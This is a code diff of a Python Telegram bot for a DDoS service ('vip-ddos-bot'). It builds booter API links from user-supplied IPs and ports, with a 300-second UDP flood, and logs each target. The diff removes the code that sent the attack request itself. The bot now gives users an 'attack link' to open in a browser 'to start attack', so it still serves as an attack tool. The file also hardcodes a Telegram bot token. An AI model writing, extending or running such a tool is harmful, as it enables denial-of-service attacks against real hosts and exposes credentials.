@@ -1,11 +1,8 @@
-import aiohttp
 import asyncio
 from datetime import datetime
 from pymongo import MongoClient
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-import nest_asyncio
-import ssl
 
 # ==================== CONFIG ====================
 BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
@@ -19,7 +16,7 @@ DB_NAME = "vip-ddos-bot"
 client = MongoClient(MONGO_URI, ssl=True, tlsAllowInvalidCertificates=True)
 db = client[DB_NAME]
 users_collection = db['users']
-attack_logs = db['attack_logs']
+link_logs = db['link_logs']  # Logs store karne ke liye
 
 def add_user(user_id, username):
     if not users_collection.find_one({'user_id': user_id}):
@@ -43,14 +40,14 @@ def is_approved(user_id):
 def get_all_users():
     return list(users_collection.find())
 
-def log_attack(user_id, ip, port, time, method, response):
-    attack_logs.insert_one({
+def log_link(user_id, ip, port, time, method, link):
+    link_logs.insert_one({
         'user_id': user_id,
         'ip': ip,
         'port': port,
         'time': time,
         'method': method,
-        'response': response,
+        'link': link,
         'timestamp': datetime.now()
     })
 
@@ -60,7 +57,7 @@ def get_owner_keyboard():
         [InlineKeyboardButton("📊 Stats", callback_data='stats')],
         [InlineKeyboardButton("👥 Pending Users", callback_data='pending')],
         [InlineKeyboardButton("✅ Approve User", callback_data='approve_menu')],
-        [InlineKeyboardButton("📜 Attack Logs", callback_data='logs')]
+        [InlineKeyboardButton("📜 Link Logs", callback_data='logs')]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -78,7 +75,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📝 Usage: send `IP PORT`\n\n"
             f"Example: `34.0.15.252 29730`\n\n"
             f"⚠️ Attack time: 300 seconds\n"
-            f"🔧 Method: UDP",
+            f"🔧 Method: UDP\n\n"
+            f"💡 Bot sirf link generate karega, request nahi bhejega!",
             parse_mode='Markdown',
             reply_markup=get_owner_keyboard()
         )
@@ -87,7 +85,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✅ Approved User: {user.first_name}\n\n"
             f"🎯 Send IP and PORT like:\n"
             f"`34.0.15.252 29730`\n\n"
-            f"⏱️ Time: 300 sec | Method: UDP",
+            f"⏱️ Time: 300 sec | Method: UDP\n\n"
+            f"💡 Bot sirf link generate karega!",
             parse_mode='Markdown'
         )
     else:
@@ -99,7 +98,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID and not is_approved(user_id):
@@ -125,28 +124,22 @@ async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port must be a number!")
         return
     
-    loading_msg = await update.message.reply_text("⏳ Sending attack request...")
-    
+    # Sirf link generate karo, request mat bhejo
     attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
     
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(attack_link) as response:
-                result = await response.text()
-                
-                log_attack(user_id, ip, port, 300, 'udp', result)
-                
-                await loading_msg.edit_text(
-                    f"✅ *Attack Sent Successfully!*\n\n"
-                    f"🎯 Target: `{ip}:{port}`\n"
-                    f"⏱️ Time: 300 seconds\n"
-                    f"🔧 Method: UDP\n\n"
-                    f"📡 Response: `{result[:100]}`\n\n"
-                    f"🔗 Final Link:\n`{attack_link}`",
-                    parse_mode='Markdown'
-                )
-    except Exception as e:
-        await loading_msg.edit_text(f"❌ Error: {str(e)}")
+    # Log store karo
+    log_link(user_id, ip, port, 300, 'udp', attack_link)
+    
+    # User ko link bhejo
+    await update.message.reply_text(
+        f"✅ *Link Generated Successfully!*\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"⏱️ Time: 300 seconds\n"
+        f"🔧 Method: UDP\n\n"
+        f"🔗 *Your Attack Link:*\n`{attack_link}`\n\n"
+        f"⚠️ Copy this link and open in browser to start attack!",
+        parse_mode='Markdown'
+    )
 
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -200,11 +193,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     
     elif query.data == 'logs':
-        logs = list(attack_logs.find().sort('timestamp', -1).limit(10))
+        logs = list(link_logs.find().sort('timestamp', -1).limit(10))
         if not logs:
-            await query.edit_message_text("📭 No attack logs found!", reply_markup=get_owner_keyboard())
+            await query.edit_message_text("📭 No link logs found!", reply_markup=get_owner_keyboard())
         else:
-            msg = "📜 *Last 10 Attacks:*\n\n"
+            msg = "📜 *Last 10 Generated Links:*\n\n"
             for log in logs:
                 msg += f"👤 User: `{log['user_id']}`\n🎯 Target: `{log['ip']}:{log['port']}`\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
             await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())
@@ -221,7 +214,7 @@ async def approve_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("❌ Usage: `/approve 123456789`", parse_mode='Markdown')
 
-# ==================== MAIN FOR HEROKU ====================
+# ==================== MAIN ====================
 if __name__ == "__main__":
     # Heroku ke liye special handling
     loop = asyncio.new_event_loop()
@@ -232,10 +225,10 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("owner", owner_panel))
     app.add_handler(CommandHandler("approve", approve_user_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, generate_link))
     app.add_handler(CallbackQueryHandler(button_callback))
     
     print("🤖 Bot is running on Heroku...")
+    print("💡 Bot will ONLY generate links, not send requests!")
     
-    # Heroku ke liye yeh tarika use karo
     app.run_polling()
